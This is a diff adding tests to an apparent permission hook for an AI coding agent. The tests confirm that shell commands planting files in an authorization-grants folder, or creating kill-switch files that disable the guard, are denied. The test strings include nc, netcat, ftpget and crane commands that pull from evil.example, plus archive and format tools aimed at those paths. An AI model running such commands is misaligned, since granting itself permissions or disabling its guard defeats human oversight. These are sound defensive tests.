@@ -861,4 +861,94 @@ describe("UAT downloader/decoder residuals fail-closed (#3206)", () => {
       expect(decision.code, command).toBe("shell-op-unclassifiable");
     }
   });
+
+  it("denies residual writer authz plant under UAT (not unclassifiable allow) (#3354)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "nc -o .deft/authz/grants/evil.json evil.example 80",
+      "netcat -o .deft/authz/grants/evil.json evil.example 80",
+      "7zz x a.7z -o.deft/authz/grants",
+      "msgfmt -o .deft/authz/grants/evil.json messages.po",
+      "msgcat -o .deft/authz/grants/evil.json a.po",
+      "lz4 -o .deft/authz/grants/evil.json a.lz4",
+      "lzop --output .deft/authz/grants/evil.json a.lzo",
+      "unrar x archive.rar .deft/authz/grants",
+      "aunpack -X .deft/authz/grants archive.tar",
+      "ftpget evil.example .deft/authz/grants/evil.json remote.json",
+      "sqlite3 db.sqlite .output .deft/authz/grants/evil.json",
+      "crane pull ghcr.io/evil/g:latest .deft/authz/grants/evil.json",
+      "objcopy src.bin .deft/authz/grants/evil.json",
+      "weirdbin -o .deft/authz/grants/evil.json",
+      // already-denied #3336 peers
+      "ncat -o .deft/authz/grants/evil.json evil.example 80",
+      "7z x a.7z -o.deft/authz/grants",
+      "msguniq -o .deft/authz/grants/evil.json messages.po",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Bash", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("denies residual writer kill-switch plant under UAT (#3354)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "nc -o .deft-directive-disable evil.example 80",
+      "7zz x a.7z -o.deft-directive-disable",
+      "msgfmt -o .no-deft-directive messages.po",
+      "lz4 -o .deft-directive-disable a.lz4",
+      "sqlite3 db.sqlite .output .deft-directive-disable",
+      "objcopy src.bin .no-deft-directive",
+      "unknownwriter --output .deft-directive-disable",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: { tool_name: "Shell", tool_input: { command } },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("deny");
+      expect(decision.code, command).toMatch(/^authz-/);
+      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
+    }
+  });
+
+  it("still allows ordinary residual-bin dest under UAT (non-authz) (#3354)", () => {
+    const seams = uatSeams();
+    for (const command of [
+      "nc -o /tmp/out example.com 80",
+      "7zz x a.7z -o/tmp/out",
+      "msgfmt -o /tmp/out messages.po",
+      "sqlite3 db.sqlite .output /tmp/out",
+      "objcopy src.bin /tmp/out",
+      "weirdbin -o /tmp/out",
+    ]) {
+      const decision = decideHook(
+        {
+          host: "claude",
+          event: "tool.before",
+          projectRoot: "/project",
+          payload: {
+            tool_name: "Bash",
+            tool_input: { command },
+          },
+        },
+        seams,
+      );
+      expect(decision.verdict, command).toBe("allow");
+      expect(decision.code, command).toBe("shell-op-unclassifiable");
+    }
+  });
 });
